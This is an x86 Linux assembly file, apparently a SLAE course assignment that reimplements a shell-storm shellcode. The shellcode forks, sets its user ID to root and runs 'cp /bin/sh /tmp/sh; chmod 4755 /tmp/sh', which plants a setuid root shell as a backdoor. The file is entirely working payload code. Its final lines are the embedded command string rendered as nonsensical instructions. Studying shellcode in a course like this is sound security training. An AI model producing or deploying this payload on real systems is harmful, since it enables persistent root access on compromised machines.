;; SLAE Assignment #6: Original Shellcode cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; Original ShellCode: http://shell-storm.org/shellcode/files/shellcode-540.php


global _start			

section .text
_start:

	sub eax,eax
	mov al,0x2
	int 0x80
	test eax,eax
	jnz 0xc
	jmp short 0x11
	sub eax,eax
	inc eax
	int 0x80
	sub eax,eax
	sub ebx,ebx
	sub ecx,ecx
	mov al,0x46
	int 0x80
	jmp short 0x47
	pop esi
	mov [esi+0x32],esi
	lea ebx,[esi+0x8]
	mov [esi+0x36],ebx
	lea ebx,[esi+0xb]
	mov [esi+0x3a],ebx
	sub eax,eax
	mov [esi+0x7],al
	mov [esi+0xa],al
	mov [esi+0x31],al
	mov [esi+0x3e],eax
	xchg esi,ebx
	mov al,0xb
	lea ecx,[ebx+0x32]
	lea edx,[ebx+0x3e]
	int 0x80
	call dword 0x1d
	das
	bound ebp,[ecx+0x6e]
	das
	jnc 0xbb
	and [dword 0x70632063],ch
	and [edi],ch
	bound ebp,[ecx+0x6e]
	das
	jnc 0xc9
	and [edi],ch
	jz 0xd2
	jo 0x96
	jnc 0xd1
	cmp esp,[eax]
	arpl [eax+0x6d],bp
	outsd
	and [fs:edi+esi],dh
	xor eax,0x742f2035
	insd
	jo 0xaa
	jnc 0xe5
